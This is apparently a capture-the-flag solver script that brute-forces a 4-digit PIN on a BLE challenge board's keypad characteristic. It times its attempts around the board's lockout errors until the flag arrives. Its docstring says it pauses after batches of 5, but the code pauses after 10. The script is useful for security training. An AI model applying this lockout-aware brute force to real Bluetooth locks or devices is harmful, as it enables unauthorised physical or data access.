#!/usr/bin/env python3
"""BLE-10 Rate-limited PIN: brute-force the 4-digit PIN (ASCII) on the vault
keypad. Every 10th wrong try starts a 1 s lockout during which writes fail with
ATT error 0x80, so we pause after each batch of 5 instead of hammering. The flag
is notified (and readable) once the right PIN is in."""
import argparse
import asyncio
import re
import time

import _util as u

KEYPAD = u.uuid(0x010A)
TRIES, LOCKOUT = 10, 1.0


async def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--start", type=int, default=0, help="first PIN to try (default 0000)")
    a, _ = p.parse_known_args()
    via = u.args(__doc__).via

    client = await u.connect()
    print(f"keypad: {await u.udesc(client, KEYPAD)}")
    status = bytes(await client.read_gatt_char(KEYPAD)).decode()
    print(f"status: {status}")
    got = asyncio.Event()
    flag = {}

    def cb(_, data):
        flag["v"] = bytes(data).decode()
        got.set()

    await client.start_notify(KEYPAD, cb)
    t0 = time.monotonic()
    m = re.match(r"LOCKED (\d) tries left", status)
    wrong = TRIES - int(m.group(1)) if m else 0  # the try counter is global on the board
    lockouts = 0
    pin = a.start
    while pin < 10000 and not got.is_set():
        try:
            await client.write_gatt_char(KEYPAD, f"{pin:04d}".encode(), response=True)
        except Exception as e:
            if "0x80" in str(e):  # locked out: back off, retry the same PIN
                wrong = 0          # the board's counter restarts with each lockout
                await asyncio.sleep(0.25)
                continue
            raise
        await asyncio.sleep(0)  # let a pending notification land
        if got.is_set():
            break
        pin += 1
        wrong += 1
        if wrong % TRIES == 0:
            lockouts += 1
            await asyncio.sleep(LOCKOUT + 0.02)
        if pin % 500 == 0:
            el = time.monotonic() - t0
            print(f"  tried up to {pin - 1:04d}, {el:.0f} s elapsed, {lockouts} lockouts")
    if not got.is_set():
        try:
            await asyncio.wait_for(got.wait(), 2)
        except asyncio.TimeoutError:
            pass
    el = time.monotonic() - t0
    if got.is_set():
        print(f"vault opened at PIN ~{pin:04d}: {pin - a.start + 1} writes, {lockouts} lockouts,"
              f" {el:.1f} s")
    status = bytes(await client.read_gatt_char(KEYPAD)).decode()
    await u.finish("BLE-10", flag.get("v") or status, via, client)


asyncio.run(main())
